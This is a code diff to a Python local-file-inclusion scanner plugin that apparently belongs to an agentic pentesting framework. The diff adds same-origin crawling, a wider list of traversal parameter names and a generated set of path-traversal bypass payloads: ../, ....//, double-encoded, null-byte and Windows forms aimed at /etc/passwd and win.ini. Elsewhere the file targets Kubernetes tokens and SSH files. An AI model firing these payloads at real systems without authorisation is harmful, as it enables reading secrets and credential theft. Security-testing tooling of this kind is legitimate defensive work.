@@ -25,8 +25,9 @@ import json
 import os
 import re
 import time
+from html.parser import HTMLParser
 from pathlib import Path
-from typing import Any, Dict, List, Optional, Tuple
+from typing import Any, ClassVar, Dict, List, Optional, Tuple
 from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse
 
 import aiohttp
@@ -39,7 +40,6 @@ from tools._agentic_exploration_common import (
     read_limited,
     same_origin,
 )
-
 
 DEFAULT_PATHS = [
     "/var/run/secrets/kubernetes.io/serviceaccount/token",
@@ -117,7 +117,28 @@ SENSITIVE_ABS_FILES = [
 ]
 SENSITIVE_SSH_USERS = ["root", "ubuntu", "www-data", "admin", "deploy", "git", "app", "sherman"]
 # Parameter names whose value is a filesystem path we will fuzz with ``../`` traversal.
-TRAVERSAL_PARAM_NAMES = {"file", "filepath", "file_path", "filename", "download", "path", "doc", "document"}
+TRAVERSAL_PARAM_NAMES = {
+    "attachment",
+    "content",
+    "doc",
+    "document",
+    "download",
+    "file",
+    "file_path",
+    "filepath",
+    "filename",
+    "folder",
+    "full_path",
+    "image",
+    "include",
+    "lang",
+    "page",
+    "path",
+    "report",
+    "resource",
+    "template",
+    "view",
+}
 DEFAULT_TRAVERSAL_DEPTHS = [1, 2, 3, 4, 5, 6, 7, 8]
 
 # Positive content signatures for the new classifications (FP-safe: a status-200
@@ -149,6 +170,56 @@ PHP_CONFIG_MARKER_RE = re.compile(
 # Recognition-only: a MySQL LOAD_FILE() DB-layer read primitive observed in the
 # request/param (this GET-only tool never executes SQLi — it tags the read).
 LOAD_FILE_RE = re.compile(r"LOAD_FILE\s*\(\s*['\"]?(?P<path>[^'\")]+)", re.I)
+UNSAFE_DISCOVERY_PATH_RE = re.compile(
+    r"(?:^|/)(?:logout|log-out|signout|sign-out|delete|destroy|remove|unsubscribe)(?:/|$)",
+    re.I,
+)
+DISCOVERY_SKIP_EXTENSIONS = {
+    ".7z",
+    ".avi",
+    ".css",
+    ".gif",
+    ".gz",
+    ".ico",
+    ".jpeg",
+    ".jpg",
+    ".js",
+    ".mov",
+    ".mp3",
+    ".mp4",
+    ".pdf",
+    ".png",
+    ".svg",
+    ".tar",
+    ".webm",
+    ".webp",
+    ".woff",
+    ".woff2",
+    ".zip",
+}
+
+
+class _SurfaceHtmlParser(HTMLParser):
+    """Collect URL-bearing HTML attributes without executing page content."""
+
+    URL_ATTRIBUTES: ClassVar[set[str]] = {"href", "src", "action", "data-src", "poster"}
+
+    def __init__(self) -> None:
+        super().__init__(convert_charrefs=True)
+        self.urls: List[str] = []
+        self.page_links: List[str] = []
+
+    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
+        lowered_tag = str(tag or "").lower()
+        for name, value in attrs:
+            lowered_name = str(name or "").lower()
+            if lowered_name not in self.URL_ATTRIBUTES or not value:
+                continue
+            candidate = str(value).strip()
+            if candidate:
+                self.urls.append(candidate)
+                if lowered_tag == "a" and lowered_name == "href":
+                    self.page_links.append(candidate)
 
 
 class LfiFileExposureProbeTool(ToolPlugin):
@@ -179,12 +250,17 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 "discoveredUrls": {"type": "array", "items": {"type": "string"}},
                 "apiEndpoints": {"type": "array"},
                 "surfaceGraph": {"type": "object"},
+                "discoverFromTarget": {"type": "boolean", "default": True},
+                "maxDiscoveryPages": {"type": "integer", "default": 3},
+                "maxDiscoveredUrls": {"type": "integer", "default": 120},
+                "maxDiscoveryBytes": {"type": "integer", "default": 500000},
                 "pathJoinMode": {"type": "string", "default": "double-slash"},
                 "maxPaths": {"type": "integer", "default": 80},
                 "maxRequests": {"type": "integer", "default": 120},
                 "maxBytes": {"type": "integer", "default": 250000},
                 "timeoutSeconds": {"type": "integer", "default": 20},
                 "includeNegativeControl": {"type": "boolean", "default": True},
+                "stopAfterFirstFinding": {"type": "boolean", "default": True},
                 "negativeControlPath": {"type": "string", "default": NEGATIVE_CONTROL_PATH},
                 "keepRawEvidence": {"type": "boolean", "default": True},
                 "includeRawBodies": {"type": "boolean", "default": False},
@@ -232,6 +308,9 @@ class LfiFileExposureProbeTool(ToolPlugin):
         max_paths = max(1, min(int(parameters.get("maxPaths") or 80), 200))
         max_requests = max(1, min(int(parameters.get("maxRequests") or 120), 300))
         max_bytes = max(1024, min(int(parameters.get("maxBytes") or 250_000), 2_000_000))
+        max_discovery_pages = max(1, min(int(parameters.get("maxDiscoveryPages") or 3), 8))
+        max_discovered_urls = max(1, min(int(parameters.get("maxDiscoveredUrls") or 120), 300))
+        max_discovery_bytes = max(4096, min(int(parameters.get("maxDiscoveryBytes") or 500_000), 2_000_000))
         timeout_seconds = max(3, min(int(parameters.get("timeoutSeconds") or 20), 120))
         decode_jwt = bool(parameters.get("decodeJwt", True))
         include_raw_bodies = bool(parameters.get("includeRawBodies", False))
@@ -251,17 +330,10 @@ class LfiFileExposureProbeTool(ToolPlugin):
 
         negative_path = self._normalize_path(str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH))
         include_negative_control = bool(parameters.get("includeNegativeControl", True))
+        stop_after_first_finding = bool(parameters.get("stopAfterFirstFinding", True))
         probe_paths = list(paths)
         if include_negative_control:
             probe_paths = [negative_path, *[path for path in probe_paths if path != negative_path]]
-        probe_specs = self._build_probe_specs(
-            target,
-            probe_paths,
-            parameters,
-            max_requests=max_requests,
-            join_mode=str(parameters.get("pathJoinMode") or "double-slash"),
-        )
-
         evidence_dir = None
         if keep_raw_evidence:
             evidence_dir = self._prepare_evidence_dir(parameters, target)
@@ -275,12 +347,39 @@ class LfiFileExposureProbeTool(ToolPlugin):
         negative_hashes = set()
         results: List[Dict[str, Any]] = []
         findings: List[Dict[str, Any]] = []
+        discovery: Dict[str, Any] = {"pagesFetched": 0, "urls": [], "errors": []}
         agent = parameters.get("_agent")
 
         async with aiohttp.ClientSession(
             connector=connector,
             timeout=aiohttp.ClientTimeout(total=timeout_seconds),
         ) as session:
+            effective_parameters = dict(parameters)
+            if bool(parameters.get("discoverFromTarget", True)):
+                if agent:
+                    agent.report_progress("Discovering same-origin file surfaces", target, 0, max_discovery_pages)
+                discovery = await self._discover_surface_urls(
+                    session,
+                    target,
+                    headers,
+                    max_pages=max_discovery_pages,
+                    max_urls=max_discovered_urls,
+                    max_bytes=max_discovery_bytes,
+                )
+                supplied = parameters.get("discoveredUrls")
+                supplied_urls = supplied if isinstance(supplied, list) else []
+                effective_parameters["discoveredUrls"] = dedupe_keep_order(
+                    [*supplied_urls, *discovery["urls"]],
+                    max_discovered_urls,
+                )
+
+            probe_specs = self._build_probe_specs(
+                target,
+                probe_paths,
+                effective_parameters,
+                max_requests=max_requests,
+                join_mode=str(parameters.get("pathJoinMode") or "double-slash"),
+            )
             for index, spec in enumerate(probe_specs, 1):
                 path = spec["path"]
                 url = spec["url"]
@@ -340,11 +439,15 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 finding = self._finding_for_evidence(evidence)
                 if finding:
                     findings.append(finding)
+                    if stop_after_first_finding:
+                        break
 
         findings = self._dedupe_findings(findings)
         raw_output = "\n".join(self._finding_line(f) for f in findings)
         return {
             "success": True,
+            "verified": bool(findings),
+            "fallback": False,
             "target": target,
             "tool": self.name,
             "evidenceDir": str(evidence_dir) if evidence_dir else None,
@@ -353,8 +456,11 @@ class LfiFileExposureProbeTool(ToolPlugin):
             "total_findings": len(findings),
             "findings_delivered": len(findings),
             "rawOutput": raw_output,
+            "discovery": discovery,
             "summary": {
                 "pathsChecked": len(results),
+                "discoveryPages": discovery["pagesFetched"],
+                "discoveredUrls": len(discovery["urls"]),
                 "surfaceCandidates": len([r for r in results if r.get("source") != "direct-path"]),
                 "confirmedReads": len([r for r in results if r.get("confirmedRead")]),
                 "tokenExposures": len([r for r in results if r.get("tokenExposure")]),
@@ -362,6 +468,86 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 "findings": len(findings),
             },
         }
+
+    async def _discover_surface_urls(
+        self,
+        session: aiohttp.ClientSession,
+        target: str,
+        headers: Dict[str, str],
+        *,
+        max_pages: int,
+        max_urls: int,
+        max_bytes: int,
+    ) -> Dict[str, Any]:
+        """Bootstrap path-like surfaces from bounded same-origin HTML GETs."""
+        queue = [target]
+        queued = {target}
+        visited = set()
+        discovered: List[str] = []
+        errors: List[str] = []
+
+        while queue and len(visited) < max_pages and len(discovered) < max_urls:
+            page_url = queue.pop(0)
+            if page_url in visited or not same_origin(target, page_url):
+                continue
+            visited.add(page_url)
+            try:
+                async with session.get(page_url, headers=headers, allow_redirects=False) as response:
+                    if response.status >= 400:
+                        errors.append(f"{page_url}: HTTP {response.status}")
+                        continue
+                    content_type = str(response.headers.get("content-type") or "").lower()
+                    body = await read_limited(response.content, max_bytes + 1)
+                    if "html" not in content_type and not body.lstrip().lower().startswith((b"<!doctype html", b"<html")):
+                        continue
+                    parser = _SurfaceHtmlParser()
+                    parser.feed(body[:max_bytes].decode("utf-8", errors="replace"))
+                    for raw in parser.urls:
+                        candidate = self._normalize_discovered_url(page_url, raw)
+                        if (
+                            candidate
+                            and same_origin(target, candidate)
+                            and not UNSAFE_DISCOVERY_PATH_RE.search(urlparse(candidate).path or "")
+                        ):
+                            discovered.append(candidate)
+                    for raw in parser.page_links:
+                        candidate = self._normalize_discovered_url(page_url, raw)
+                        if (
+                            candidate
+                            and candidate not in queued
+                            and candidate not in visited
+                            and same_origin(target, candidate)
+                            and self._is_safe_discovery_page(candidate)
+                        ):
+                            queued.add(candidate)
+                            queue.append(candidate)
+            except Exception as exc:
+                errors.append(f"{page_url}: {str(exc)[:160]}")
+
+        return {
+            "pagesFetched": len(visited),
+            "urls": dedupe_keep_order(discovered, max_urls),
+            "errors": errors[:10],
+        }
+
+    def _normalize_discovered_url(self, base_url: str, raw: str) -> Optional[str]:
+        candidate = str(raw or "").strip()
+        if not candidate or candidate.startswith(("#", "javascript:", "mailto:", "tel:", "data:")):
+            return None
+        try:
+            parsed = urlparse(urljoin(base_url, candidate))._replace(fragment="")
+            if parsed.scheme not in {"http", "https"} or not parsed.netloc:
+                return None
+            return urlunparse(parsed)
+        except Exception:
+            return None
+
+    def _is_safe_discovery_page(self, url: str) -> bool:
+        parsed = urlparse(url)
+        if UNSAFE_DISCOVERY_PATH_RE.search(parsed.path or ""):
+            return False
+        suffix = Path(parsed.path or "").suffix.lower()
+        return suffix not in DISCOVERY_SKIP_EXTENSIONS
 
     async def _fetch(
         self,
@@ -817,15 +1003,20 @@ class LfiFileExposureProbeTool(ToolPlugin):
             seen.add(key)
             specs.append({"path": path, "url": url, "source": source})
 
-        for path in probe_paths:
-            add(path, self._build_lfi_url(target, path, join_mode), "direct-path")
-
+        # #1285: parameterized surfaces are the high-signal path-traversal sink.
+        # Schedule them before the legacy direct-path pack so a bounded
+        # maxRequests=50 run cannot spend its entire budget on //etc/* URLs.
         for url in self._surface_lfi_candidate_urls(target, probe_paths, parameters):
             parsed = urlparse(url)
             path_hint = self._path_hint_from_url(parsed)
             add(path_hint, url, "surface-derived")
             if len(specs) >= max_requests:
                 break
+
+        for path in probe_paths:
+            if len(specs) >= max_requests:
+                break
+            add(path, self._build_lfi_url(target, path, join_mode), "direct-path")
         return specs[:max_requests]
 
     def _surface_lfi_candidate_urls(
@@ -849,6 +1040,17 @@ class LfiFileExposureProbeTool(ToolPlugin):
             if LOAD_FILE_RE.search(source_url):
                 candidates.append(source_url)
             if parsed.query:
+                # #1285: put a surface-specific negative control and one
+                # representative from every authored path-traversal bypass
+                # family first. The depth expansions follow inside the helper.
+                negative_path = self._normalize_path(
+                    str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH)
+                )
+                if bool(parameters.get("includeNegativeControl", True)):
+                    rendered = self._replace_lfi_query_params(source_url, negative_path)
+                    if rendered:
+                        candidates.append(rendered)
+                candidates.extend(self._path_traversal_bypass_urls(source_url, depths))
                 for path in lfi_paths:
                     rendered = self._replace_lfi_query_params(source_url, path)
                     if rendered:
@@ -873,6 +1075,64 @@ class LfiFileExposureProbeTool(ToolPlugin):
                 if rendered:
                     candidates.append(rendered)
         return dedupe_keep_order([url for url in candidates if same_origin(target, url)], 240)
+
+    def _path_traversal_bypass_urls(self, url: str, depths: List[int]) -> List[str]:
+        """Build a compact, ordered V1-V6 bypass ladder for path-like params.
+
+        The first candidates cover every authored family at a representative
+        depth. Remaining depths are expanded only afterwards, keeping all six
+        classes reachable within a small request budget.
+        """
+        parsed = urlparse(url)
+        query = parse_qsl(parsed.query, keep_blank_values=True)
+        path_values = [value for name, value in query if name.lower() in TRAVERSAL_PARAM_NAMES]
+        if not path_values:
+            return []
+
+        ordered_depths = dedupe_keep_order(
+            [3, *[depth for depth in depths if isinstance(depth, int) and 0 < depth <= 12]],
+            12,
+        )
+        primary_depth = ordered_depths[0]
+        original_value = path_values[0]
+        original_dir = original_value.rsplit("/", 1)[0] if original_value.startswith("/") and "/" in original_value else ""
+        original_ext = Path(original_value).suffix if original_value else ""
+        extensions = dedupe_keep_order([original_ext, ".png", ".jpg"], 3)
+
+        def plain(depth: int) -> str:
+            return ("../" * depth) + "etc/passwd"
+
+        def nested(depth: int) -> str:
+            return ("....//" * depth) + "etc/passwd"
+
+        def double_encoded(depth: int) -> str:
+            # urlencode() below escapes '%' once more, producing the desired
+            # on-wire %252e%252e%252f sequence for a two-stage decoder.
+            return ("%2e%2e%2f" * depth) + "etc%2fpasswd"
+
+        payloads: List[str] = [
+            plain(primary_depth),
+            "/etc/passwd",
+            nested(primary_depth),
+            double_encoded(primary_depth),
+        ]
+        if original_dir:
+            payloads.append(f"{original_dir}/{plain(primary_depth)}")
+        for extension in extensions:
+            if extension:
+                payloads.append(f"{plain(primary_depth)}\x00{extension}")
+        payloads.append(("..\\" * primary_depth) + "windows\\win.ini")
+
+        remaining_depths = [depth for depth in ordered_depths if depth != primary_depth]
+        for depth in remaining_depths:
+            payloads.extend([plain(depth), nested(depth), double_encoded(depth)])
+            if original_dir:
+                payloads.append(f"{original_dir}/{plain(depth)}")
+            if extensions:
+                payloads.append(f"{plain(depth)}\x00{extensions[0]}")
+
+        candidates = [self._replace_traversal_param(url, payload) for payload in payloads]
+        return dedupe_keep_order([candidate for candidate in candidates if candidate], 80)
 
     def _sensitive_traversal_targets(self, parameters: Dict[str, Any]) -> List[str]:
         """Relative-form secret targets (no leading slash) for ``../`` prefixing."""
